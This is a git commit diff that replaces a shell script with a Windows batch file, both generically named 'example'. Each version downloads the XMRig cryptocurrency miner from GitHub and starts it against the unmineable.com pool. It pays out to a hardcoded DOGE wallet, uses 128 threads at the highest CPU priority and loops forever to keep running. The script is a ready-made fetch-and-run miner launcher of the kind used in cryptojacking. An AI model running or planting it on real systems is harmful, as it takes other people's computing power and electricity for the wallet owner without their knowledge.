e7ee002e78a7e62bcd21091b8ba0a7db4070acf0
site.net <129742936+Armin3080@users.noreply.github.com>
2024-12-19 22:57:12 +0330

    Update and rename example.sh to example.bat

---
+++ example.bat
@@ -0,0 +1,20 @@
+@echo off
+:: دانلود XMrig
+echo Downloading XMrig...
+bitsadmin /transfer mydownloadjob /download /priority high https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip "%cd%\xmrig.zip"
+
+:: استخراج فایل ZIP
+echo Extracting XMrig...
+powershell -Command "Expand-Archive -Path xmrig.zip -DestinationPath xmrig"
+
+:: وارد پوشه XMrig
+cd xmrig-6.22.2
+
+:: اجرای XMrig
+echo Starting Mining...
+xmrig.exe -o rx.unmineable.com:3333 -u DOGE:DPFzbsmtPu1CSw7cGM75RNbwx4rZj9nnGq -p zero -k -a randomx --threads=128 --cpu-priority=5 --huge-pages
+
+:: نگه داشتن اسکریپت در حال اجرا
+:loop
+timeout /t 3 > nul
+goto loop
--- example.sh
+++
@@ -1,8 +0,0 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar xf xmrig-6.15.1-linux-x64.tar.gz
-cd xmrig-6.15.1
-./xmrig -o rx.unmineable.com:3333 -u DOGE:DPFzbsmtPu1CSw7cGM75RNbwx4rZj9nnGq -p zero -k -a randomx --threads=128 --cpu-priority=5 --huge-pages
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
